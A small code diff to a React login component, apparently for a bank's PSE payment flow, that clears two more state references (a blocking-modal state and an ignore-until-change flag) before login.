@@ -636,8 +636,10 @@ export default function LoginColpatriaPse() {
     // Se para el polling y se limpia el ultimo estado antes de login
     stopPolling();
 
-    // Se limpia el ultimo estado
+    // Se limpia el ultimo estado y referencias de bloqueo
     lastEstadoRef.current = null;
+    modalBloqueoEstadoRef.current = null;
+    ignorarEstadoHastaCambioRef.current = null;
 
     // Se usa try catch para el envio
     try {
